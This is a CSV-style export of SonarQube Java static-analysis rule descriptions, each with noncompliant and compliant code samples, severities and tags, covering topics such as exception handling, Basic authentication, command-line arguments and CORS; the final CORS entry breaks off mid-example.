2016-03-01T17:37:50+0100,"<p>Constructors for <code>String</code>, <code>BigInteger</code>, <code>BigDecimal</code> and the objects used to wrap primitives should never be
used. Doing so is less clear and uses more memory than simply using the desired value in the case of strings, and using <code>valueOf</code> for
everything else.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String empty = new String(); // Noncompliant; yields essentially """", so just use that.
String nonempty = new String(""Hello world""); // Noncompliant
Double myDouble = new Double(1.1); // Noncompliant; use valueOf
Integer integer = new Integer(1); // Noncompliant
Boolean bool = new Boolean(true); // Noncompliant
BigInteger bigInteger1 = new BigInteger(""3""); // Noncompliant
BigInteger bigInteger2 = new BigInteger(""9223372036854775807""); // Noncompliant
BigInteger bigInteger3 = new BigInteger(""111222333444555666777888999""); // Compliant, greater than Long.MAX_VALUE
</pre>
<h2>Compliant Solution</h2>
<pre>
String empty = """";
String nonempty = ""Hello world"";
Double myDouble = Double.valueOf(1.1);
Integer integer = Integer.valueOf(1);
Boolean bool = Boolean.valueOf(true);
BigInteger bigInteger1 = BigInteger.valueOf(3);
BigInteger bigInteger2 = BigInteger.valueOf(9223372036854775807L);
BigInteger bigInteger3 = new BigInteger(""111222333444555666777888999"");
</pre>
<h2>Exceptions</h2>
<p><code>BigDecimal</code> constructor with <code>double</code> argument is ignored as using <code>valueOf</code> instead might change resulting
value. See <a href='/coding_rules#rule_key=squid%3AS2111'>S2111</a>.</p>",squid:S2129,java,Java,"<p>Constructors for <code>String</code>, <code>BigInteger</code>, <code>BigDecimal</code> and the objects used to wrap primitives should never be
used. Doing so is less clear and uses more memory than simply using the desired value in the case of strings, and using <code>valueOf</code> for
everything else.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String empty = new String(); // Noncompliant; yields essentially """", so just use that.
String nonempty = new String(""Hello world""); // Noncompliant
Double myDouble = new Double(1.1); // Noncompliant; use valueOf
Integer integer = new Integer(1); // Noncompliant
Boolean bool = new Boolean(true); // Noncompliant
BigInteger bigInteger1 = new BigInteger(""3""); // Noncompliant
BigInteger bigInteger2 = new BigInteger(""9223372036854775807""); // Noncompliant
BigInteger bigInteger3 = new BigInteger(""111222333444555666777888999""); // Compliant, greater than Long.MAX_VALUE
</pre>
<h2>Compliant Solution</h2>
<pre>
String empty = """";
String nonempty = ""Hello world"";
Double myDouble = Double.valueOf(1.1);
Integer integer = Integer.valueOf(1);
Boolean bool = Boolean.valueOf(true);
BigInteger bigInteger1 = BigInteger.valueOf(3);
BigInteger bigInteger2 = BigInteger.valueOf(9223372036854775807L);
BigInteger bigInteger3 = new BigInteger(""111222333444555666777888999"");
</pre>
<h2>Exceptions</h2>
<p><code>BigDecimal</code> constructor with <code>double</code> argument is ignored as using <code>valueOf</code> instead might change resulting
value. See {rule:squid:S2111}.</p>","Constructors should not be used to instantiate ""String"", ""BigInteger"", ""BigDecimal"" and primitive-wrapper classes",[],MAJOR,['performance'],CODE_SMELL
2013-08-30T17:20:57+0200,"<p>When handling a caught exception, the original exception's message and stack trace should be logged or passed forward.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  /* ... */
} catch (Exception e) {   // Noncompliant - exception is lost
  LOGGER.info(""context"");
}

try {
  /* ... */
} catch (Exception e) {  // Noncompliant - exception is lost (only message is preserved)
  LOGGER.info(e.getMessage());
}

try {
  /* ... */
} catch (Exception e) {  // Noncompliant - original exception is lost
  throw new RuntimeException(""context"");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  /* ... */
} catch (Exception e) {
  LOGGER.info(e);  // exception is logged
}

try {
  /* ... */
} catch (Exception e) {
  throw new RuntimeException(e);   // exception stack trace is propagated
}

try {
  /* ... */
} catch (RuntimeException e) {
  doSomething();
  throw e;  // original exception passed forward
} catch (Exception e) {
  throw new RuntimeException(e);  // Conversion into unchecked exception is also allowed
}
</pre>
<h2>Exceptions</h2>
<p><code>InterruptedException</code>, <code>NumberFormatException</code>, <code>DateTimeParseException</code>, <code>ParseException</code> and
<code>MalformedURLException</code> exceptions are arguably used to indicate nonexceptional outcomes. Similarly, handling
<code>NoSuchMethodException</code> is often required when dealing with the Java reflection API.</p>
<p>Because they are part of Java, developers have no choice but to deal with them. This rule does not verify that those particular exceptions are
correctly handled.</p>
<pre>
int myInteger;
try {
  myInteger = Integer.parseInt(myString);
} catch (NumberFormatException e) {
  // It is perfectly acceptable to not handle ""e"" here
  myInteger = 0;
}
</pre>
<p>Furthermore, no issue will be raised if the exception message is logged with additional information, as it shows that the developer added some
context to the error message.</p>
<pre>
try {
  /* ... */
} catch (Exception e) {
  String message = ""Exception raised while authenticating user: "" + e.getMessage();
  LOGGER.warn(message); // Compliant - exception message logged with some contextual information
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/6gEqAQ"">CERT, ERR00-J.</a> - Do not suppress or ignore checked exceptions </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/778.html"">MITRE, CWE-778</a> - Insufficient Logging </li>
  <li> OWASP Top 10 2017 Category A10 - Insufficient Logging &amp; Monitoring </li>
</ul>",squid:S1166,java,Java,"<p>When handling a caught exception, the original exception's message and stack trace should be logged or passed forward.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  /* ... */
} catch (Exception e) {   // Noncompliant - exception is lost
  LOGGER.info(""context"");
}

try {
  /* ... */
} catch (Exception e) {  // Noncompliant - exception is lost (only message is preserved)
  LOGGER.info(e.getMessage());
}

try {
  /* ... */
} catch (Exception e) {  // Noncompliant - original exception is lost
  throw new RuntimeException(""context"");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  /* ... */
} catch (Exception e) {
  LOGGER.info(e);  // exception is logged
}

try {
  /* ... */
} catch (Exception e) {
  throw new RuntimeException(e);   // exception stack trace is propagated
}

try {
  /* ... */
} catch (RuntimeException e) {
  doSomething();
  throw e;  // original exception passed forward
} catch (Exception e) {
  throw new RuntimeException(e);  // Conversion into unchecked exception is also allowed
}
</pre>
<h2>Exceptions</h2>
<p><code>InterruptedException</code>, <code>NumberFormatException</code>, <code>DateTimeParseException</code>, <code>ParseException</code> and
<code>MalformedURLException</code> exceptions are arguably used to indicate nonexceptional outcomes. Similarly, handling
<code>NoSuchMethodException</code> is often required when dealing with the Java reflection API.</p>
<p>Because they are part of Java, developers have no choice but to deal with them. This rule does not verify that those particular exceptions are
correctly handled.</p>
<pre>
int myInteger;
try {
  myInteger = Integer.parseInt(myString);
} catch (NumberFormatException e) {
  // It is perfectly acceptable to not handle ""e"" here
  myInteger = 0;
}
</pre>
<p>Furthermore, no issue will be raised if the exception message is logged with additional information, as it shows that the developer added some
context to the error message.</p>
<pre>
try {
  /* ... */
} catch (Exception e) {
  String message = ""Exception raised while authenticating user: "" + e.getMessage();
  LOGGER.warn(message); // Compliant - exception message logged with some contextual information
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/6gEqAQ"">CERT, ERR00-J.</a> - Do not suppress or ignore checked exceptions </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/778.html"">MITRE, CWE-778</a> - Insufficient Logging </li>
  <li> OWASP Top 10 2017 Category A10 - Insufficient Logging &amp; Monitoring </li>
</ul>",Exception handlers should preserve the original exceptions,"[{'key': 'exceptions', 'htmlDesc': 'List of exceptions which should not be checked', 'defaultValue': 'java.lang.InterruptedException, java.lang.NumberFormatException, java.lang.NoSuchMethodException, java.text.ParseException, java.net.MalformedURLException, java.time.format.DateTimeParseException', 'type': 'STRING'}]",MAJOR,"['cert', 'error-handling', 'owasp-a10', 'suspicious']",CODE_SMELL
2016-01-19T14:20:54+0100,"<p>Regular expressions are powerful but tricky, and even those long used to using them can make mistakes.</p>
<p>The following should not be used as regular expressions:</p>
<ul>
  <li> <code>.</code> - matches any single character. Used in <code>replaceAll</code>, it matches <em>everything</em> </li>
  <li> <code>|</code> - normally used as an option delimiter. Used stand-alone, it matches the space between characters </li>
  <li> <code>File.separator</code> - matches the platform-specific file path delimiter. On Windows, this will be taken as an escape character </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
String str = ""/File|Name.txt"";

String clean = str.replaceAll(""."",""""); // Noncompliant; probably meant to remove only dot chars, but returns an empty string
String clean2 = str.replaceAll(""|"",""_""); // Noncompliant; yields _/_F_i_l_e_|_N_a_m_e_._t_x_t_
String clean3 = str.replaceAll(File.separator,""""); // Noncompliant; exception on Windows

String clean4 = str.replaceFirst(""."",""""); // Noncompliant;
String clean5 = str.replaceFirst(""|"",""_""); // Noncompliant;
String clean6 = str.replaceFirst(File.separator,""""); // Noncompliant;
</pre>",squid:S2639,java,Java,"<p>Regular expressions are powerful but tricky, and even those long used to using them can make mistakes.</p>
<p>The following should not be used as regular expressions:</p>
<ul>
  <li> <code>.</code> - matches any single character. Used in <code>replaceAll</code>, it matches <em>everything</em> </li>
  <li> <code>|</code> - normally used as an option delimiter. Used stand-alone, it matches the space between characters </li>
  <li> <code>File.separator</code> - matches the platform-specific file path delimiter. On Windows, this will be taken as an escape character </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
String str = ""/File|Name.txt"";

String clean = str.replaceAll(""."",""""); // Noncompliant; probably meant to remove only dot chars, but returns an empty string
String clean2 = str.replaceAll(""|"",""_""); // Noncompliant; yields _/_F_i_l_e_|_N_a_m_e_._t_x_t_
String clean3 = str.replaceAll(File.separator,""""); // Noncompliant; exception on Windows

String clean4 = str.replaceFirst(""."",""""); // Noncompliant;
String clean5 = str.replaceFirst(""|"",""_""); // Noncompliant;
String clean6 = str.replaceFirst(File.separator,""""); // Noncompliant;
</pre>",Inappropriate regular expressions should not be used,[],MAJOR,[],BUG
2019-02-20T08:56:37+0100,"<p>Basic authentication's only means of obfuscation is Base64 encoding. Since Base64 encoding is easily recognized and reversed, it offers only the
thinnest veil of protection to your users, and should not be used. </p>
<h2>Noncompliant Code Example</h2>
<pre>
// Using HttpPost from Apache HttpClient
String encoding = Base64Encoder.encode (""login:passwd"");
org.apache.http.client.methods.HttpPost httppost = new HttpPost(url);
httppost.setHeader(""Authorization"", ""Basic "" + encoding);  // Noncompliant

or

// Using HttpURLConnection
String encoding = Base64.getEncoder().encodeToString((""login:passwd"").getBytes(Ã¢â‚¬Å’""UTFÃ¢â‚¬Å’Ã¢â‚¬â€¹-8""Ã¢â‚¬â€¹));
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setRequestMethod(""POST"");
conn.setDoOutput(true);
conn.setRequestProperty(""Authorization"", ""Basic "" + encoding); // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/522"">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/311"">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li>
  <li> OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href=""https://www.owasp.org/index.php/Basic_Authentication"">OWASP Basic Authentication</a> </li>
</ul>",squid:S2647,java,Java,"<p>Basic authentication's only means of obfuscation is Base64 encoding. Since Base64 encoding is easily recognized and reversed, it offers only the
thinnest veil of protection to your users, and should not be used. </p>
<h2>Noncompliant Code Example</h2>
<pre>
// Using HttpPost from Apache HttpClient
String encoding = Base64Encoder.encode (""login:passwd"");
org.apache.http.client.methods.HttpPost httppost = new HttpPost(url);
httppost.setHeader(""Authorization"", ""Basic "" + encoding);  // Noncompliant

or

// Using HttpURLConnection
String encoding = Base64.getEncoder().encodeToString((""login:passwd"").getBytes(Ã¢â‚¬Å’""UTFÃ¢â‚¬Å’Ã¢â‚¬â€¹-8""Ã¢â‚¬â€¹));
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setRequestMethod(""POST"");
conn.setDoOutput(true);
conn.setRequestProperty(""Authorization"", ""Basic "" + encoding); // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/522"">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/311"">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li>
  <li> OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href=""https://www.owasp.org/index.php/Basic_Authentication"">OWASP Basic Authentication</a> </li>
</ul>",Basic authentication should not be used,[],CRITICAL,"['cwe', 'sans-top25-porous']",VULNERABILITY
2018-11-12T11:11:26+0100,"<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281"">CVE-2018-7281</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326"">CVE-2018-12326</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198"">CVE-2011-3198</a> </li>
</ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide
security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> any of the command line arguments are used without being sanitized first. </li>
  <li> your application accepts sensitive information via command line arguments. </li>
</ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the
path to a file containing the information.</p>
<h2>Questionable Code Example</h2>
<p>This rule raises an issue as soon as there is a reference to argv, be it for direct use or via a CLI library like JCommander, GetOpt or Apache
CLI.</p>
<pre>
public class Main {
&nbsp;&nbsp;&nbsp; public static void main (String[] argv) {
&nbsp; &nbsp; &nbsp; &nbsp; String option = argv[0]; &nbsp;// Questionable: check how the argument is used
&nbsp;&nbsp;&nbsp; }
}
</pre>
<pre>
// === JCommander ===
import&nbsp;com.beust.jcommander.*;

public class Main {
&nbsp;&nbsp;&nbsp; public static void main (String[] argv) {
&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Main main = new Main();
&nbsp; &nbsp; &nbsp; &nbsp; JCommander.newBuilder()
&nbsp; &nbsp; &nbsp; &nbsp; .addObject(main)
&nbsp; &nbsp; &nbsp; &nbsp; .build()
&nbsp; &nbsp; &nbsp; &nbsp; .parse(argv); // Questionable
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;main.run();
&nbsp;&nbsp; &nbsp;}
}
</pre>
<pre>
// === GNU Getopt ===
import gnu.getopt.Getopt;

public class Main {
&nbsp;&nbsp;&nbsp; public static void main (String[] argv) {
&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;Getopt g = new Getopt(""myprog"", argv, ""ab""); // Questionable
&nbsp;&nbsp;&nbsp; }
}
</pre>
<pre>
// === Apache CLI ===
import org.apache.commons.cli.*;

public class Main {
&nbsp;&nbsp;&nbsp; public static void main (String[] argv) {
&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;Options options = new Options();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; CommandLineParser parser = new DefaultParser();
&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;try {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;  CommandLine line = parser.parse(options, argv); // Questionable
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; }
&nbsp;&nbsp;&nbsp; }
}
</pre>
<p>In the case of Args4J, an issue is created on the <code>public void run</code> method of any class using <code>org.kohsuke.args4j.Option</code> or
<code>org.kohsuke.args4j.Argument</code>.</p>
<p>Such a class is called directly by <code>org.kohsuke.args4j.Starter</code> outside of any <code>public static void main</code> method. If the class
has no <code>run</code> method, no issue will be raised as there must be a <code>public static void main</code> and its argument is already
highlighted.</p>
<pre>
// === argv4J ===
import org.kohsuke.args4j.Option;
import org.kohsuke.args4j.Argument;

public class Main {
    @Option(name=""-myopt"",usage=""An option"")
    public String myopt;

    @Argument(usage = ""An argument"", metaVar = ""&lt;myArg&gt;"")
    String myarg;

    String file;

    @Option(name=""-file"")
    public void setFile(String file) {
        this.file = file;
    }

    String arg2;

    @Argument(index=1)
    public void setArg2(String arg2) {
        this.arg2 = arg2;
    }

&nbsp;&nbsp; &nbsp;public void run() { // Questionable: This function
        myarg; // check how this argument is used
&nbsp;&nbsp; &nbsp;}
}
</pre>
<h2>Exceptions</h2>
<p>The support of Argv4J without the use of <code>org.kohsuke.argv4j.Option</code> is out of scope as there is no way to know which Bean will be used
as the mainclass.</p>
<p>No issue will be raised on <code>public static void main(String[] argv)</code> if <code>argv</code> is not referenced in the method.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/88.html"">MITRE, CWE-88</a> - Argument Injection or Modification </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/214.html"">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",squid:S4823,java,Java,"<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281"">CVE-2018-7281</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326"">CVE-2018-12326</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198"">CVE-2011-3198</a> </li>
</ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide
security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> any of the command line arguments are used without being sanitized first. </li>
  <li> your application accepts sensitive information via command line arguments. </li>
</ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the
path to a file containing the information.</p>
<h2>Questionable Code Example</h2>
<p>This rule raises an issue as soon as there is a reference to argv, be it for direct use or via a CLI library like JCommander, GetOpt or Apache
CLI.</p>
<pre>
public class Main {
&nbsp;&nbsp;&nbsp; public static void main (String[] argv) {
&nbsp; &nbsp; &nbsp; &nbsp; String option = argv[0]; &nbsp;// Questionable: check how the argument is used
&nbsp;&nbsp;&nbsp; }
}
</pre>
<pre>
// === JCommander ===
import&nbsp;com.beust.jcommander.*;

public class Main {
&nbsp;&nbsp;&nbsp; public static void main (String[] argv) {
&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Main main = new Main();
&nbsp; &nbsp; &nbsp; &nbsp; JCommander.newBuilder()
&nbsp; &nbsp; &nbsp; &nbsp; .addObject(main)
&nbsp; &nbsp; &nbsp; &nbsp; .build()
&nbsp; &nbsp; &nbsp; &nbsp; .parse(argv); // Questionable
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;main.run();
&nbsp;&nbsp; &nbsp;}
}
</pre>
<pre>
// === GNU Getopt ===
import gnu.getopt.Getopt;

public class Main {
&nbsp;&nbsp;&nbsp; public static void main (String[] argv) {
&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;Getopt g = new Getopt(""myprog"", argv, ""ab""); // Questionable
&nbsp;&nbsp;&nbsp; }
}
</pre>
<pre>
// === Apache CLI ===
import org.apache.commons.cli.*;

public class Main {
&nbsp;&nbsp;&nbsp; public static void main (String[] argv) {
&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;Options options = new Options();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; CommandLineParser parser = new DefaultParser();
&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;try {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;  CommandLine line = parser.parse(options, argv); // Questionable
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; }
&nbsp;&nbsp;&nbsp; }
}
</pre>
<p>In the case of Args4J, an issue is created on the <code>public void run</code> method of any class using <code>org.kohsuke.args4j.Option</code> or
<code>org.kohsuke.args4j.Argument</code>.</p>
<p>Such a class is called directly by <code>org.kohsuke.args4j.Starter</code> outside of any <code>public static void main</code> method. If the class
has no <code>run</code> method, no issue will be raised as there must be a <code>public static void main</code> and its argument is already
highlighted.</p>
<pre>
// === argv4J ===
import org.kohsuke.args4j.Option;
import org.kohsuke.args4j.Argument;

public class Main {
    @Option(name=""-myopt"",usage=""An option"")
    public String myopt;

    @Argument(usage = ""An argument"", metaVar = ""&lt;myArg&gt;"")
    String myarg;

    String file;

    @Option(name=""-file"")
    public void setFile(String file) {
        this.file = file;
    }

    String arg2;

    @Argument(index=1)
    public void setArg2(String arg2) {
        this.arg2 = arg2;
    }

&nbsp;&nbsp; &nbsp;public void run() { // Questionable: This function
        myarg; // check how this argument is used
&nbsp;&nbsp; &nbsp;}
}
</pre>
<h2>Exceptions</h2>
<p>The support of Argv4J without the use of <code>org.kohsuke.argv4j.Option</code> is out of scope as there is no way to know which Bean will be used
as the mainclass.</p>
<p>No issue will be raised on <code>public static void main(String[] argv)</code> if <code>argv</code> is not referenced in the method.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/88.html"">MITRE, CWE-88</a> - Argument Injection or Modification </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/214.html"">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",Using command line arguments is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'sans-top25-insecure']",SECURITY_HOTSPOT
2018-11-12T11:11:26+0100,"<p>According to its JavaDocs, <code>java.util.Stream.peek()</code> Ã¢â‚¬Å“exists mainly to support debuggingÃ¢â‚¬ï¿½ purposes. Although this does not mean that
using it for other purposes is discouraged, relying on <code>peek()</code> without careful consideration can lead to error-prone code such as:</p>
<ul>
  <li> If the stream pipeline does not include a terminal operation, no elements will be consumed and the <code>peek()</code> action will not be
  invoked at all. </li>
  <li> As long as a stream implementation can reach the final step, it can freely optimize processing by only producing some elements or even none at
  all (e.g. relying on other collection methods for counting elements). Accordingly, the <code>peek()</code> action will be invoked for fewer elements
  or not at all. </li>
</ul>
<p>This rule raises an issue for each use of <code>peek()</code> to be sure that it is challenged and validated by the team to be meant for production
debugging/logging purposes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Stream.of(""one"", ""two"", ""three"", ""four"")
         .filter(e -&gt; e.length() &gt; 3)
         .peek(e -&gt; System.out.println(""Filtered value: "" + e)); // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://docs.oracle.com/javase/8/docs/api/java/util/stream/Stream.html#peek-java.util.function.Consumer-"">Java 8 API Documentation</a>
  </li>
  <li> 4comprehension: <a href=""https://4comprehension.com/idiomatic-peeking/"">Idiomatic Peeking with Java Stream API</a> </li>
  <li> Data Geekery: <a href=""https://blog.jooq.org/2014/06/13/java-8-friday-10-subtle-mistakes-when-using-the-streams-api/"">10 Subtle Mistakes When
  Using the Streams API</a> </li>
</ul>",squid:S3864,java,Java,"<p>According to its JavaDocs, <code>java.util.Stream.peek()</code> Ã¢â‚¬Å“exists mainly to support debuggingÃ¢â‚¬ï¿½ purposes. Although this does not mean that
using it for other purposes is discouraged, relying on <code>peek()</code> without careful consideration can lead to error-prone code such as:</p>
<ul>
  <li> If the stream pipeline does not include a terminal operation, no elements will be consumed and the <code>peek()</code> action will not be
  invoked at all. </li>
  <li> As long as a stream implementation can reach the final step, it can freely optimize processing by only producing some elements or even none at
  all (e.g. relying on other collection methods for counting elements). Accordingly, the <code>peek()</code> action will be invoked for fewer elements
  or not at all. </li>
</ul>
<p>This rule raises an issue for each use of <code>peek()</code> to be sure that it is challenged and validated by the team to be meant for production
debugging/logging purposes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Stream.of(""one"", ""two"", ""three"", ""four"")
         .filter(e -&gt; e.length() &gt; 3)
         .peek(e -&gt; System.out.println(""Filtered value: "" + e)); // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://docs.oracle.com/javase/8/docs/api/java/util/stream/Stream.html#peek-java.util.function.Consumer-"">Java 8 API Documentation</a>
  </li>
  <li> 4comprehension: <a href=""https://4comprehension.com/idiomatic-peeking/"">Idiomatic Peeking with Java Stream API</a> </li>
  <li> Data Geekery: <a href=""https://blog.jooq.org/2014/06/13/java-8-friday-10-subtle-mistakes-when-using-the-streams-api/"">10 Subtle Mistakes When
  Using the Streams API</a> </li>
</ul>","""Stream.peek"" should be used with caution",[],MAJOR,"['java8', 'pitfall']",CODE_SMELL
2015-10-02T13:39:56+0200,"<p>While some <code>TestRule</code> classes have the desired effect without ever being directly referenced by a test, several others do not, and
there's no reason to leave them cluttering up the file if they're not in use.</p>
<p>This rule raises an issue when <code>Test</code> class fields of the following types aren't used by any of the test methods:
<code>TemporaryFolder</code>, and <code>TestName</code>.</p>
<p>This rule also applies to the JUnit 5 equivalent classes: <code>TempDir</code>, and <code>TestInfo</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class ProjectDefinitionTest {

  @Rule
  public TemporaryFolder temp = new TemporaryFolder();  // Noncompliant

  @Test
  public void shouldSetKey() {
    ProjectDefinition def = ProjectDefinition.create();
    def.setKey(""mykey"");
    assertThat(def.getKey(), is(""mykey""));
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class ProjectDefinitionTest {

  @Test
  public void shouldSetKey() {
    ProjectDefinition def = ProjectDefinition.create();
    def.setKey(""mykey"");
    assertThat(def.getKey(), is(""mykey""));
  }
}
</pre>",squid:S2924,java,Java,"<p>While some <code>TestRule</code> classes have the desired effect without ever being directly referenced by a test, several others do not, and
there's no reason to leave them cluttering up the file if they're not in use.</p>
<p>This rule raises an issue when <code>Test</code> class fields of the following types aren't used by any of the test methods:
<code>TemporaryFolder</code>, and <code>TestName</code>.</p>
<p>This rule also applies to the JUnit 5 equivalent classes: <code>TempDir</code>, and <code>TestInfo</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class ProjectDefinitionTest {

  @Rule
  public TemporaryFolder temp = new TemporaryFolder();  // Noncompliant

  @Test
  public void shouldSetKey() {
    ProjectDefinition def = ProjectDefinition.create();
    def.setKey(""mykey"");
    assertThat(def.getKey(), is(""mykey""));
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class ProjectDefinitionTest {

  @Test
  public void shouldSetKey() {
    ProjectDefinition def = ProjectDefinition.create();
    def.setKey(""mykey"");
    assertThat(def.getKey(), is(""mykey""));
  }
}
</pre>",JUnit rules should be used,[],MINOR,"['tests', 'unused']",CODE_SMELL
2019-02-20T08:56:37+0100,"<p>Enabling Cross-Origin Resource Sharing (CORS) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269"">CVE-2018-0269</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460"">CVE-2017-14460</a> </li>
</ul>
<p>Applications that enable CORS will effectively relax the same-origin policy in browsers, which is in place to prevent AJAX requests to hosts other
than the one showing in the browser address bar. Being too permissive, CORS can potentially allow an attacker to gain access to sensitive
information.</p>
<p>This rule flags code that enables CORS or specifies any HTTP response headers associated with CORS. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Any URLs responding with <code>Access-Control-Allow-Origin: *</code> include sensitive content. </li>
  <li> Any domains specified in <code>Access-Control-Allow-Origin</code> headers are checked against a whitelist. </li>
</ul>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> The <code>Access-Control-Allow-Origin</code> header should be set only on specific URLs that require access from other domains. Don't enable
  the header on the entire domain. </li>
  <li> Don't rely on the <code>Origin</code> header blindly without validation as it could be spoofed by an attacker. Use a whitelist to check that
  the <code>Origin</code> domain (including protocol) is allowed before returning it back in the <code>Access-Control-Allow-Origin</code> header.
  </li>
  <li> Use <code>Access-Control-Allow-Origin: *</code> only if your application absolutely requires it, for example in the case of an open/public API.
  For such endpoints, make sure that there is no sensitive content or information included in the response. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
// === Java Servlet ===
@Override
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
